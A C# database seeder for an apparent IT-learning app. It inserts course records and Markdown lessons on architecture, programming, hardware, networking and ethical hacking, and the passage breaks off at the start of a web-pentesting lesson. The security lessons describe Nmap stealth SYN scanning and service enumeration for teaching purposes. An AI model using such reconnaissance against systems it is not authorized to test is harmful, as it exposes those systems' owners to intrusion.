using System;
using System.Collections.Generic;
using Microsoft.Data.Sqlite;
using BhavaniTech.Core.Models;

namespace BhavaniTech.Core.Database
{
    public static partial class CurriculumSeeder
    {
        public record CourseSeed(string Id, string Title, CourseCategory Category, string Description, string IconKey, int SortOrder);
        public record ModuleSeed(string Id, string CourseId, string Title, int SortOrder);
        public record LessonSeed(string Id, string ModuleId, string Title, string Summary, string ContentMarkdown, int EstimatedMinutes, string Difficulty);
        public record QuizSeed(string LessonId, string QuestionText, string OptionA, string OptionB, string OptionC, string OptionD, string CorrectOption, string Explanation);

        public static void EnsureCurriculumSeeded(SqliteConnection conn)
        {
            using var countCmd = conn.CreateCommand();
            countCmd.CommandText = "SELECT COUNT(*) FROM Lessons";
            long lessonCount = (long)(countCmd.ExecuteScalar() ?? 0);

            using var quizCountCmd = conn.CreateCommand();
            quizCountCmd.CommandText = "SELECT COUNT(*) FROM QuizQuestions";
            long quizCount = (long)(quizCountCmd.ExecuteScalar() ?? 0);

            // If already seeded with all 108 lessons and 108 quizzes, skip
            if (lessonCount >= 108 && quizCount >= 108) return;

            using var tx = conn.BeginTransaction();

            // Clear old minimal curriculum to cleanly replace with full multi-tiered Basics to Masters curriculum
            using (var clearCmd = conn.CreateCommand())
            {
                clearCmd.Transaction = tx;
                clearCmd.CommandText = "DELETE FROM QuizQuestions; DELETE FROM Lessons; DELETE FROM Modules; DELETE FROM Courses;";
                clearCmd.ExecuteNonQuery();
            }

            // 1. Seed Courses (11 Core Disciplines)
            var courses = new CourseSeed[]
            {
                new("CS101", "Computer Fundamentals & Architecture", CourseCategory.Fundamentals, "Explore binary math, CPU registers, ALU execution, and OS kernel paging.", "Laptop", 1),
                new("PROG101", "Polyglot Programming Academy", CourseCategory.Programming, "Master C#, Python, memory stack/heap, OOP, and advanced algorithms.", "Code", 2),
                new("SW101", "Software Engineering, Compilers & DevOps", CourseCategory.Programming, "Understand compiler lexing, AST parsing, OS process scheduling, and Git version control.", "Layers", 3),
                new("HW101", "Hardware Assembly & PC Builder", CourseCategory.Hardware, "Select CPUs, motherboards, RAM, GPUs, PSUs, and diagnose POST errors.", "Cpu", 4),
                new("HW201", "Advanced Microarchitecture & Buses", CourseCategory.Hardware, "Calculate DDR4/DDR5 CAS latencies, dual-channel bandwidth, and PCIe Gen1-5 speeds.", "Cpu", 5),
                new("NET101", "Networking & CCNA/CCNP Essentials", CourseCategory.Networking, "Master OSI 7-layer model, IPv4 CIDR subnetting, VLANs, and TCP/IP routing.", "Network", 6),
                new("SEC101", "Cybersecurity & Ethical Hacking Mastery", CourseCategory.Cybersecurity, "Master penetration testing, Nmap scanning, SQL injection, XSS, and cryptography.", "Shield", 7),
                new("LNX101", "Linux Systems & Kernel Administration", CourseCategory.Linux, "Master Linux shell, chmod octal permissions, SUID, systemd, and bash scripting.", "Terminal", 8),
                new("ELE101", "Electronics, Circuits & Robotics", CourseCategory.Electronics, "Master Ohm's Law (V=IR), logic gates, LED current limiters, and microcontrollers.", "Zap", 9),
                new("AI101", "Artificial Intelligence & Prompt Engineering", CourseCategory.ArtificialIntelligence, "Understand decision trees, neural networks, backpropagation, and local AI prompts.", "Brain", 10),
                new("IT101", "IT Troubleshooting & Systems Engineering", CourseCategory.Troubleshooting, "Diagnose PC boot failures, DNS/DHCP issues, network drops, and slow storage.", "Wrench", 11)
            };

            var allCourses = new List<CourseSeed>(courses);
            allCourses.AddRange(GetAdvancedCourses());
            allCourses.AddRange(GetGreyHatCourses());

            foreach (var c in allCourses)
            {
                using var cmd = conn.CreateCommand();
                cmd.Transaction = tx;
                cmd.CommandText = "INSERT INTO Courses (Id, Title, Category, Description, IconKey, SortOrder) VALUES (@id, @title, @cat, @desc, @icon, @sort)";
                cmd.Parameters.AddWithValue("@id", c.Id);
                cmd.Parameters.AddWithValue("@title", c.Title);
                cmd.Parameters.AddWithValue("@cat", (int)c.Category);
                cmd.Parameters.AddWithValue("@desc", c.Description);
                cmd.Parameters.AddWithValue("@icon", c.IconKey);
                cmd.Parameters.AddWithValue("@sort", c.SortOrder);
                cmd.ExecuteNonQuery();
            }

            // 2. Seed Modules (1 Module per course for clarity)
            var modules = new ModuleSeed[]
            {
                new("M_CS", "CS101", "Computer Architecture & OS Internals", 1),
                new("M_PRG", "PROG101", "Polyglot Programming & Algorithms", 1),
                new("M_SW", "SW101", "Compilers, Schedulers & System Architecture", 1),
                new("M_HW", "HW101", "Component Selection & Hardware Diagnostics", 1),
                new("M_HW2", "HW201", "Microarchitecture, Buses & Cache Latency", 1),
                new("M_NET", "NET101", "Network Architecture, Routing & Subnetting", 1),
                new("M_SEC", "SEC101", "Ethical Hacking, Penetration Testing & Defense", 1),
                new("M_LNX", "LNX101", "Linux Administration & Kernel Interfaces", 1),
                new("M_ELE", "ELE101", "Circuit Design, Logic Gates & Embedded Systems", 1),
                new("M_AI", "AI101", "Machine Learning, Neural Nets & Prompt Engineering", 1),
                new("M_IT", "IT101", "Enterprise IT Troubleshooting & Diagnostics", 1)
            };

            var allModules = new List<ModuleSeed>(modules);
            allModules.AddRange(GetAdvancedModules());
            allModules.AddRange(GetGreyHatModules());

            foreach (var m in allModules)
            {
                using var cmd = conn.CreateCommand();
                cmd.Transaction = tx;
                cmd.CommandText = "INSERT INTO Modules (Id, CourseId, Title, SortOrder) VALUES (@id, @cId, @title, @sort)";
                cmd.Parameters.AddWithValue("@id", m.Id);
                cmd.Parameters.AddWithValue("@cId", m.CourseId);
                cmd.Parameters.AddWithValue("@title", m.Title);
                cmd.Parameters.AddWithValue("@sort", m.SortOrder);
                cmd.ExecuteNonQuery();
            }

            // 3. Seed 108 Comprehensive Lessons (Basics → Intermediate → Advanced → Master → Grey Hat)
            var lessons = GetLessonsList();
            lessons.AddRange(GetAdvancedLessons());
            lessons.AddRange(GetGreyHatLessons());

            var quizzes = GetQuizzesList();
            quizzes.AddRange(GetAdvancedQuizzes());
            quizzes.AddRange(GetGreyHatQuizzes());

            foreach (var l in lessons)
            {
                using var cmd = conn.CreateCommand();
                cmd.Transaction = tx;
                cmd.CommandText = @"INSERT INTO Lessons (Id, ModuleId, Title, Summary, ContentMarkdown, EstimatedMinutes, Difficulty) 
                                   VALUES (@id, @mId, @title, @sum, @md, @mins, @diff)";
                cmd.Parameters.AddWithValue("@id", l.Id);
                cmd.Parameters.AddWithValue("@mId", l.ModuleId);
                cmd.Parameters.AddWithValue("@title", l.Title);
                cmd.Parameters.AddWithValue("@sum", l.Summary);
                cmd.Parameters.AddWithValue("@md", l.ContentMarkdown);
                cmd.Parameters.AddWithValue("@mins", l.EstimatedMinutes);
                cmd.Parameters.AddWithValue("@diff", l.Difficulty);
                cmd.ExecuteNonQuery();
            }

            foreach (var q in quizzes)
            {
                using var cmd = conn.CreateCommand();
                cmd.Transaction = tx;
                cmd.CommandText = @"INSERT INTO QuizQuestions (LessonId, QuestionText, OptionA, OptionB, OptionC, OptionD, CorrectOption, Explanation)
                                   VALUES (@lId, @q, @a, @b, @c, @d, @corr, @exp)";
                cmd.Parameters.AddWithValue("@lId", q.LessonId);
                cmd.Parameters.AddWithValue("@q", q.QuestionText);
                cmd.Parameters.AddWithValue("@a", q.OptionA);
                cmd.Parameters.AddWithValue("@b", q.OptionB);
                cmd.Parameters.AddWithValue("@c", q.OptionC);
                cmd.Parameters.AddWithValue("@d", q.OptionD);
                cmd.Parameters.AddWithValue("@corr", q.CorrectOption);
                cmd.Parameters.AddWithValue("@exp", q.Explanation);
                cmd.ExecuteNonQuery();
            }

            tx.Commit();
        }

        private static List<LessonSeed> GetLessonsList()
        {
            return new List<LessonSeed>
            {
                // =========================================================================
                // 1. COMPUTER FUNDAMENTALS (CS101)
                // =========================================================================
                new("L_CS_1", "M_CS", "Level 1: Binary Math, Transistors & Digital Logic",
                    "Learn how silicon transistors represent 0 and 1, and master binary, octal, and hexadecimal representation.",
                    "# Level 1: Binary Math, Transistors & Digital Logic\n\nAll digital electronics operate on the flow of electrons through microscopic silicon **transistors**. Transistors act as solid-state electrical switches:\n- **Low Voltage (0V - 0.8V)**: Represents binary **0** (False / Off).\n- **High Voltage (1.8V - 5.0V)**: Represents binary **1** (True / On).\n\n### Units of Digital Data:\n- **Bit**: A single binary digit (0 or 1).\n- **Nibble**: 4 bits (e.g., `1010` = Hexadecimal `A`).\n- **Byte**: 8 bits (256 possible combinations: 0 to 255).\n- **Kilobyte (KB)**: 1,024 bytes ($2^{10}$).\n- **Megabyte (MB)**: 1,048,576 bytes ($2^{20}$).\n- **Gigabyte (GB)**: 1,073,741,824 bytes ($2^{30}$).\n\n### Binary Addition Rules:\n- $0 + 0 = 0$\n- $0 + 1 = 1$\n- $1 + 1 = 10_2$ (0 with a carry of 1).\n- $1 + 1 + 1 = 11_2$ (1 with a carry of 1).\n\n*Takeaway*: Everything you see on a monitor—images, games, 3D graphics—is represented as binary numbers processed billions of times per second.",
                    12, "Basics"),

                new("L_CS_2", "M_CS", "Level 2: CPU Registers, ALU & The Machine Cycle",
                    "Understand how the Central Processing Unit executes instructions via Program Counter, ALU, and Registers.",
                    "# Level 2: CPU Registers, ALU & The Machine Cycle\n\nThe CPU is the brain of the computer. It executes instructions sequentially through the **Von Neumann Architecture**.\n\n### Core CPU Components:\n1. **Program Counter (PC)**: A hardware register holding the memory address of the next instruction to fetch.\n2. **Instruction Register (IR)**: Temporarily stores the fetched opcode while decoding.\n3. **Arithmetic Logic Unit (ALU)**: The mathematical core executing arithmetic (`ADD`, `SUB`) and logic (`AND`, `OR`, `XOR`, `CMP`).\n4. **General Purpose Registers**: Ultra-fast storage on the CPU die (e.g. `RAX`, `RBX`, `RCX` on x86-64).\n\n### The 4-Stage Machine Cycle:\n```\n[ 1. FETCH ] -> [ 2. DECODE ] -> [ 3. EXECUTE ] -> [ 4. WRITEBACK ]\n```\nOn a **1.2 GHz processor**, this cycle occurs up to **1,200,000,000 times every single second**!",
                    15, "Intermediate"),

                new("L_CS_3", "M_CS", "Level 3: Operating System Kernels, Virtual Memory & Paging",
                    "Master virtual address spaces, Memory Management Units (MMU), page tables, and page fault handling.",
                    "# Level 3: Operating System Kernels, Virtual Memory & Paging\n\nAn Operating System (OS) provides an abstraction layer between user applications and bare hardware.\n\n### Virtual Memory & Paging Architecture:\n- Instead of granting programs direct access to physical RAM addresses, the OS assigns each process a private **Virtual Address Space**.\n- Memory is divided into fixed-size chunks called **Pages** (typically 4 KB on x86/ARM).\n- Physical RAM is divided into matching chunks called **Frames**.\n\n### The Memory Management Unit (MMU):\n- When a program accesses memory address `0x00401000`, the hardware **MMU** checks the **Page Table** to translate it to physical address `0x1A401000`.\n- **Translation Lookaside Buffer (TLB)**: An ultra-fast hardware cache storing recent virtual-to-physical address mappings.\n- **Page Fault**: When an application accesses a page stored in swap/pagefile on disk, the CPU raises an interrupt, loading the page into RAM.",
                    18, "Advanced"),

                new("L_CS_4", "M_CS", "Level 4: System Calls, Interrupt Request Lines (IRQ) & Hardware Drivers",
                    "Master kernel privilege rings (Ring 0 vs Ring 3), interrupt handlers, and hardware abstraction layers.",
                    "# Level 4: System Calls, Interrupt Request Lines (IRQ) & Hardware Drivers\n\n### CPU Privilege Rings (x86 Protection Hierarchy):\n- **Ring 0 (Kernel Mode)**: Full unrestricted access to physical memory, CPU control registers (`CR0`, `CR3`), and I/O ports.\n- **Ring 3 (User Mode)**: Sandboxed execution mode where user applications (browsers, IDEs) run without direct hardware access.\n\n### System Calls (Syscalls):\nWhen a user application wants to read a file or send a network packet:\n1. Application prepares parameters in CPU registers (`RAX = Syscall ID`).\n2. Executes the `syscall` (or `int 0x80`) instruction.\n3. CPU transitions from Ring 3 to Ring 0.\n4. Kernel executes the requested driver routine, validates security boundaries, and returns results.\n\n### Hardware Interrupts (IRQ):\nWhen you press a key on your keyboard or an Ethernet packet arrives, the peripheral asserts an **Interrupt Request Line (IRQ)**, pausing the CPU to run the **Interrupt Service Routine (ISR)**.",
                    20, "Master"),

                // =========================================================================
                // 2. PROGRAMMING ACADEMY (PROG101)
                // =========================================================================
                new("L_PRG_1", "M_PRG", "Level 1: Variables, Dynamic vs Static Typing & Control Flow",
                    "Learn variable declarations, type safety, conditional branching, and iteration in Python, C#, and C.",
                    "# Level 1: Variables, Dynamic vs Static Typing & Control Flow\n\nPrograms manipulate data stored in variables. A variable is an identifier bound to a memory location.\n\n### Static Typing vs Dynamic Typing:\n- **Static Typing (C#, C, Java)**: Variable types are verified at compile time.\n  ```csharp\n  int studentCount = 30; // Strongly typed 32-bit signed integer\n  ```\n- **Dynamic Typing (Python, JavaScript)**: Types are bound to values at runtime.\n  ```python\n  student_count = 30 # Inferred as integer automatically\n  ```\n\n### Control Flow:\n- `if / else`: Branches execution based on boolean evaluation.\n- `for / while`: Executes code blocks repeatedly until termination conditions are met.",
                    12, "Basics"),

                new("L_PRG_2", "M_PRG", "Level 2: Functions, Memory Stack vs Heap & References",
                    "Master function call frames, recursion, stack frame allocation, and heap pointer references.",
                    "# Level 2: Functions, Memory Stack vs Heap & References\n\nUnderstanding where data resides in memory is what separates beginner coders from systems engineers.\n\n### The Memory Stack:\n- Managed directly by the CPU architecture via the Stack Pointer (`RSP`).\n- Operates as a Last-In, First-Out (LIFO) structure.\n- Stores local primitive variables and function return addresses.\n- Extremely fast: Allocation involves only decrementing the stack pointer.\n\n### The Memory Heap:\n- Used for objects whose size is unknown at compile-time or that outlive function scopes.\n- Requires dynamic allocation (`malloc` in C, `new` in C#/Java).\n- Managed via manual deallocation or automatic **Garbage Collection (GC)**.",
                    16, "Intermediate"),

                new("L_PRG_3", "M_PRG", "Level 3: Object-Oriented Architecture & SOLID Design Principles",
                    "Master Encapsulation, Inheritance, Polymorphism, Abstraction, and SOLID architectural patterns.",
                    "# Level 3: Object-Oriented Architecture & SOLID Design Principles\n\nObject-Oriented Programming (OOP) groups state (fields) and behavior (methods) into cohesive classes.\n\n### Core OOP Pillars:\n1. **Encapsulation**: Hiding internal implementation details using access modifiers (`private`, `protected`).\n2. **Inheritance**: Deriving specialized subclasses from general base classes.\n3. **Polymorphism**: Treating derived objects through base class or interface pointers.\n4. **Abstraction**: Exposing clean interfaces while hiding complex internal workflows.\n\n### The SOLID Principles:\n- **S**: Single Responsibility Principle.\n- **O**: Open/Closed Principle (Open for extension, closed for modification).\n- **L**: Liskov Substitution Principle.\n- **I**: Interface Segregation Principle.\n- **D**: Dependency Inversion Principle.",
                    18, "Advanced"),

                new("L_PRG_4", "M_PRG", "Level 4: Advanced Algorithms & Big-O Computational Complexity",
                    "Master Big-O time and space complexity, Binary Search Trees, Graph Traversals, and Dynamic Programming.",
                    "# Level 4: Advanced Algorithms & Big-O Computational Complexity\n\n**Big-O Notation** evaluates how algorithmic runtime or memory scales as input size $N$ increases.\n\n| Complexity | Name | Example Algorithm |\n| :--- | :--- | :--- |\n| $O(1)$ | Constant Time | Hash Table Key Lookup |\n| $O(\\log N)$ | Logarithmic Time | Binary Search in Sorted Array |\n| $O(N)$ | Linear Time | Linear Scan through Array |\n| $O(N \\log N)$ | Linearithmic Time | MergeSort / QuickSort |\n| $O(N^2)$ | Quadratic Time | Nested Loops (BubbleSort) |\n| $O(2^N)$ | Exponential Time | Brute-force Password Guessing |\n\n### Graph Traversal Primitives:\n- **Breadth-First Search (BFS)**: Uses a Queue to find the shortest path in unweighted graphs.\n- **Dijkstra's Algorithm**: Uses a Min-Priority Queue to find shortest paths across weighted network topologies.",
                    22, "Master"),

                // =========================================================================
                // 3. SOFTWARE ENGINEERING & COMPILERS (SW101)
                // =========================================================================
                new("L_SW_1", "M_SW", "Level 1: SDLC, Git Distributed Version Control & Clean Code",
                    "Understand software lifecycles, Git commit trees, branching, merges, and clean code principles.",
                    "# Level 1: SDLC, Git Distributed Version Control & Clean Code\n\nSoftware engineering transforms programming into repeatable, maintainable systems.\n\n### The Software Development Life Cycle (SDLC):\n1. Requirements Analysis & Threat Modeling.\n2. Architecture & Design Specification.\n3. Implementation & Safe Coding.\n4. Testing & Continuous Integration.\n5. Deployment, Monitoring & Maintenance.\n\n### Git Version Control:\n- Git stores file changes as a directed acyclic graph (DAG) of cryptographic SHA-1/SHA-256 snapshots.\n- `git commit`: Records staged changes.\n- `git branch`: Creates lightweight pointers to specific commits.\n- `git merge`: Integrates independent development timelines.",
                    12, "Basics"),

                new("L_SW_2", "M_SW", "Level 2: Compiler Front-End: Lexical Tokenizing & AST Parsing",
                    "Understand how high-level code is transformed into tokens, grammar parse trees, and Abstract Syntax Trees.",
                    "# Level 2: Compiler Front-End: Lexical Tokenizing & AST Parsing\n\nCompilers translate human-readable source code into machine-executable binary opcodes.\n\n### The 3 Stages of Compiler Front-End:\n1. **Lexical Analysis (Scanner / Lexer)**:\n   Reads raw source code strings and converts them into structured **Tokens** (e.g., `KEYWORD`, `IDENTIFIER`, `LITERAL`).\n2. **Syntactic Analysis (Parser)**:\n   Validates token sequences against Context-Free Grammars (BNF) to produce an **Abstract Syntax Tree (AST)**.\n3. **Semantic Analysis**:\n   Performs type-checking, scope resolution, and variable declaration validation.\n\n*Interactive*: You can run our built-in Compiler Lexer in the Software Engineering Lab tab!",
                    16, "Intermediate"),

                new("L_SW_3", "M_SW", "Level 3: OS Process Schedulers: FIFO, SJF & Priority Preemption",
                    "Simulate OS CPU scheduling algorithms, calculate wait times, turnaround metrics, and prevent deadlocks.",
                    "# Level 3: OS Process Schedulers: FIFO, SJF & Priority Preemption\n\nThe Operating System scheduler multiplexes CPU cores among dozens of concurrent active processes.\n\n### Major Scheduling Algorithms:\n1. **FIFO (First-In, First-Out)**: Processes are executed strictly in order of arrival.\n2. **SJF (Shortest Job First)**: Prioritizes processes with smallest burst times, minimizing average wait time.\n3. **Priority Scheduling**: Allocates CPU time to critical tasks first; handles process starvation using aging.\n4. **Round Robin (RR)**: Allocates fixed time slices (quanta) to each process in turn for interactive responsiveness.\n\n### Key Metrics:\n- **Wait Time**: Total time a process spends waiting in the ready queue.\n- **Turnaround Time**: Completion Timestamp minus Arrival Timestamp.",
                    18, "Advanced"),

                new("L_SW_4", "M_SW", "Level 4: Distributed Systems, Microservices & High-Performance Pipelines",
                    "Master decoupled architectures, message queues, idempotent APIs, CAP theorem, and event-driven computing.",
                    "# Level 4: Distributed Systems, Microservices & High-Performance Pipelines\n\nEnterprise software spans distributed clusters communicating across networks.\n\n### The CAP Theorem:\nA distributed data store can guarantee at most two of the following three properties:\n- **Consistency (C)**: Every read receives the most recent write or an error.\n- **Availability (A)**: Every request receives a non-error response without guarantee of latest data.\n- **Partition Tolerance (P)**: System continues operating despite network drops between nodes.\n\n### Core Distributed Patterns:\n- **Idempotency**: Repeatedly executing an operation yields identical state without unintended side-effects.\n- **Message Queues**: Decoupling producer and consumer workloads via asynchronous message buffers.",
                    22, "Master"),

                // =========================================================================
                // 4. HARDWARE & PC BUILDER (HW101)
                // =========================================================================
                new("L_HW_1", "M_HW", "Level 1: PC Anatomy: CPU, Motherboard, RAM, GPU, PSU & Storage",
                    "Learn the physical and electrical roles of every internal computer component and connection bus.",
                    "# Level 1: PC Anatomy: Core Hardware Components\n\nEvery personal computer consists of standardized modular subsystems:\n- **CPU**: Executes instruction cycles.\n- **Motherboard (Mainboard)**: The printed circuit board (PCB) connecting all components.\n- **RAM**: High-speed volatile memory for active processes.\n- **GPU**: Specialized processor with thousands of parallel arithmetic cores for rendering.\n- **Storage (SSD / HDD)**: Non-volatile storage keeping operating systems and files intact without power.\n- **Power Supply Unit (PSU)**: Converts AC mains power (110V/230V) to regulated DC power (+3.3V, +5V, +12V rails).",
                    12, "Basics"),

                new("L_HW_2", "M_HW", "Level 2: Motherboard Sockets, Form Factors & VRM Power Delivery",
                    "Understand LGA vs PGA/AM sockets, ATX/Micro-ATX/ITX form factors, and voltage regulator modules.",
                    "# Level 2: Sockets, Form Factors & VRMs\n\n### CPU Sockets:\n- **LGA (Land Grid Array - Intel)**: Pins are on the motherboard socket; CPU bottom has flat contact pads.\n- **PGA (Pin Grid Array - Legacy AMD)**: Pins are on the CPU package.\n\n### Voltage Regulator Modules (VRM):\nCPUs require clean, steady power around 1.1V to 1.3V with currents exceeding 100 Amps! The VRM steps down the 12V PSU rail to CPU Vcore using MOSFET switches, chokes (inductors), and capacitors.",
                    15, "Intermediate"),

                new("L_HW_3", "M_HW", "Level 3: Storage Interfaces: SATA vs NVMe PCIe Gen3/4/5 & RAID",
                    "Understand storage protocols, AHCI vs NVMe, PCIe direct bus attachment, and RAID configurations.",
                    "# Level 3: Storage Interfaces & RAID Arrays\n\n### Interface Speeds:\n- **SATA III (AHCI)**: Max throughput ~600 MB/s (Limited by legacy storage controller bottleneck).\n- **NVMe (PCIe Gen 3 x4)**: ~3,500 MB/s.\n- **NVMe (PCIe Gen 4 x4)**: ~7,500 MB/s.\n- **NVMe (PCIe Gen 5 x4)**: ~14,000 MB/s.\n\n### RAID Configurations:\n- **RAID 0 (Striping)**: Splits data across two drives. High performance, zero redundancy.\n- **RAID 1 (Mirroring)**: Duplicate copy on both drives. 100% data safety if one drive fails.",
                    18, "Advanced"),

                new("L_HW_4", "M_HW", "Level 4: BIOS/UEFI Firmware, POST Diagnostics & Power Sizing",
                    "Master UEFI bootstrapping, POST beep codes, hex debug displays, and electrical wattage calculations.",
                    "# Level 4: BIOS/UEFI Firmware & POST Diagnostics\n\n### Bootstrapping Sequence:\n1. PSU sends `Power Good` signal (+5V) to motherboard.\n2. CPU initializes and executes UEFI firmware instructions located in SPI Flash ROM.\n3. **POST (Power-On Self-Test)** checks RAM, CPU, GPU, and keyboard.\n4. UEFI identifies the boot disk and transfers control to the OS Boot Manager.\n\n### POST Diagnostic Indicators:\n- Continuous short beeps: Power supply or RAM fault.\n- 1 Long, 2 Short beeps: GPU failure or missing monitor connection.",
                    20, "Master"),

                // =========================================================================
                // 5. ADVANCED MICROARCHITECTURE (HW201)
                // =========================================================================
                new("L_HW2_1", "M_HW2", "Level 1: CPU Clock Frequencies, Instructions Per Cycle & SMT",
                    "Understand clock cycles, IPC throughput, multi-core division, and Simultaneous Multithreading.",
                    "# Level 1: Clock Frequencies, IPC & SMT\n\nPerformance is defined by the Fundamental CPU Performance Equation:\n$$\\text{Execution Time} = \\text{Instruction Count} \\times \\text{CPI} \\times \\text{Clock Cycle Time}$$\n\n- **Clock Frequency (GHz)**: Number of clock pulses per second.\n- **IPC (Instructions Per Cycle)**: Architecture efficiency.\n- **SMT (Simultaneous Multithreading / Hyper-Threading)**: Allows a single physical CPU core with duplicate architectural state registers to execute two threads concurrently.",
                    14, "Basics"),

                new("L_HW2_2", "M_HW2", "Level 2: CPU Cache Hierarchy: L1i/L1d, L2 & L3 Latency",
                    "Understand SRAM cache architecture, cache lines, associativity, cache hits, and cache misses.",
                    "# Level 2: CPU Cache Hierarchy & Latency\n\nBecause accessing physical RAM takes ~80-100 nanoseconds (hundreds of wasted CPU clock cycles), CPUs embed ultra-fast Static RAM (SRAM) caches:\n- **L1 Cache (32-64 KB per core)**: Split into L1 Instruction (L1i) and L1 Data (L1d). Latency: ~1-2 ns (4-5 cycles).\n- **L2 Cache (512 KB - 2 MB per core)**: Latency: ~3-5 ns.\n- **L3 Cache (Shared die, 16-96 MB)**: Latency: ~10-15 ns.\n\n*Cache Hit Ratio*: High-performance software optimizes data layout so >95% of memory requests are fulfilled directly from L1/L2 caches.",
                    16, "Intermediate"),

                new("L_HW2_3", "M_HW2", "Level 3: Memory Subsystems: DDR4 vs DDR5 CAS Latency Math",
                    "Master memory timing calculations, CAS latency nanosecond equations, and dual-channel bus speeds.",
                    "# Level 3: DDR4 vs DDR5 CAS Latency & Bandwidth\n\n### True Latency Equation:\n$$\\text{True Latency (ns)} = \\frac{\\text{CAS Latency (CL)} \\times 2000}{\\text{Data Rate (MT/s)}}$$\n\n### Comparison:\n- **DDR4-3200 CL16**: $(16 \\times 2000) / 3200 = \\mathbf{10.0\\text{ ns}}$\n- **DDR5-6000 CL36**: $(36 \\times 2000) / 6000 = \\mathbf{12.0\\text{ ns}}$\n\nWhile DDR5 has slightly higher initial access latency, its total memory bandwidth is double that of DDR4 due to higher clock frequency and dual 32-bit subchannels per DIMM.",
                    18, "Advanced"),

                new("L_HW2_4", "M_HW2", "Level 4: PCIe Expansion Protocols, DMA & GPU Lane Calculations",
                    "Calculate PCIe Generation 1-5 throughput, lane routing ($x1, x4, x8, x16$), and Direct Memory Access.",
                    "# Level 4: PCIe Expansion Protocols & Direct Memory Access (DMA)\n\nPCIe is a point-to-point serial interconnect standard.\n\n### Bandwidth Per Lane (x1):\n- PCIe Gen 3: ~0.985 GB/s\n- PCIe Gen 4: ~1.969 GB/s\n- PCIe Gen 5: ~3.938 GB/s\n\n### Full x16 GPU Bandwidth:\n- PCIe Gen 4 x16: $\\approx 31.5\\text{ GB/s}$\n- PCIe Gen 5 x16: $\\approx 63.0\\text{ GB/s}$\n\n### Direct Memory Access (DMA):\nAllows PCIe peripherals (NICs, NVMe drives) to read and write directly to physical system RAM without consuming CPU clock cycles.",
                    20, "Master"),

                // =========================================================================
                // 6. NETWORKING & CCNA (NET101)
                // =========================================================================
                new("L_NET_1", "M_NET", "Level 1: The OSI 7-Layer Model & TCP/IP Protocol Stack",
                    "Master packet encapsulation from Application layer to Physical electrical bits.",
                    "# Level 1: The OSI 7-Layer Model & TCP/IP Protocol Stack\n\nThe OSI Model partitions network communications into 7 logical layers:\n- **Layer 7: Application** (HTTP, DNS, SSH, DHCP)\n- **Layer 6: Presentation** (TLS encryption, ASCII, JPEG)\n- **Layer 5: Session** (RPC, NetBIOS)\n- **Layer 4: Transport** (TCP reliable segments, UDP datagrams)\n- **Layer 3: Network** (IP packets, Logical routing)\n- **Layer 2: Data Link** (Ethernet frames, MAC addressing, Switches)\n- **Layer 1: Physical** (Bits, RJ45 copper, fiber, Wi-Fi radio waves).",
                    12, "Basics"),

                new("L_NET_2", "M_NET", "Level 2: IPv4 Subnetting, CIDR Notation & Host Calculations",
                    "Master binary subnetting math, netmasks, broadcast boundaries, and usable host formulas.",
                    "# Level 2: IPv4 Subnetting & CIDR Math\n\nSubnetting divides a large network into smaller sub-networks.\n\n### Usable Host Formula:\n$$\\text{Usable Hosts} = 2^{\\text{Host Bits}} - 2$$\n\n### CIDR Reference:\n- `/24` = `255.255.255.0` (8 host bits = 254 usable IPs)\n- `/26` = `255.255.255.192` (6 host bits = 62 usable IPs)\n- `/28` = `255.255.255.240` (4 host bits = 14 usable IPs)\n- `/30` = `255.255.255.252` (2 host bits = 2 point-to-point router IPs).",
                    16, "Intermediate"),

                new("L_NET_3", "M_NET", "Level 3: Ethernet Switching, VLAN Segmentation & STP (802.1Q)",
                    "Understand switch MAC address tables, VLAN isolation, trunking encapsulation, and loop prevention.",
                    "# Level 3: Switching, VLANs & Spanning Tree Protocol (STP)\n\n### Virtual LANs (VLANs):\n- Logically segments a single physical switch into isolated broadcast domains.\n- **IEEE 802.1Q**: Adds a 4-byte VLAN tag to Ethernet frame headers across Trunk links.\n\n### Spanning Tree Protocol (STP / 802.1D):\nPrevents catastrophic **Broadcast Storms** caused by redundant physical switch loops by blocking duplicate paths until a primary link fails.",
                    18, "Advanced"),

                new("L_NET_4", "M_NET", "Level 4: TCP 3-Way Handshake, Windowing, UDP & OSPF/BGP Routing",
                    "Master TCP sequence and acknowledgement flags, sliding window flow control, and dynamic routing.",
                    "# Level 4: TCP Internals & Dynamic Routing Protocols\n\n### TCP 3-Way Handshake:\n1. `Client -> Server`: `SYN` (Seq = X)\n2. `Server -> Client`: `SYN, ACK` (Seq = Y, Ack = X + 1)\n3. `Client -> Server`: `ACK` (Ack = Y + 1)\n\n### Dynamic Routing:\n- **OSPF (Open Shortest Path First)**: Interior Gateway Protocol using Link-State Dijkstra calculations.\n- **BGP (Border Gateway Protocol)**: Path-Vector exterior routing protocol that powers the global Internet.",
                    22, "Master"),

                // =========================================================================
                // 7. CYBERSECURITY & ETHICAL HACKING (SEC101)
                // =========================================================================
                new("L_SEC_1", "M_SEC", "Level 1: Ethical Hacking Legal Ethics, CIA Triad & Threat Modeling",
                    "Master ethical hacking rules of engagement, confidentiality, integrity, availability, and threat surfaces.",
                    "# Level 1: Ethical Hacking Foundations & CIA Triad\n\n### The CIA Security Triad:\n- **Confidentiality**: Ensuring data is accessible only to authorized entities (Encryption, Access Controls).\n- **Integrity**: Guaranteeing data is not tampered with or altered (Cryptographic Hashes like SHA-256).\n- **Availability**: Ensuring services and systems remain operational (DDoS defense, redundancy).\n\n### Ethical Rules of Engagement (RoE):\nEthical hackers (White Hats) perform security assessments ONLY under signed legal authorization.",
                    14, "Basics"),

                new("L_SEC_2", "M_SEC", "Level 2: Network Reconnaissance, Nmap Scans & Banner Grabbing",
                    "Master passive and active reconnaissance, TCP SYN stealth scanning, and service version enumeration.",
                    "# Level 2: Network Reconnaissance & Port Scanning\n\nReconnaissance maps the target's attack surface.\n\n### Nmap Scan Types:\n- **TCP SYN Scan (`-sS`)**: Half-open stealth scan. Sends SYN, gets SYN-ACK, immediately sends RST to prevent complete connection logging.\n- **Version Detection (`-sV`)**: Interrogates open ports with probe packets to determine daemon software and version.\n- **NSE Scripts (`-sC`)**: Automates vulnerability detection using the Nmap Scripting Engine.",
                    16, "Intermediate"),

                new("L_SEC_3", "M_SEC", "Level 3: Web Application Pentesting: OWASP Top 10, SQLi & XSS",
                    "Learn to identify, exploit, and remediate SQL Injection, Cross-Site Scripting, and CSRF vulnerabilities.",
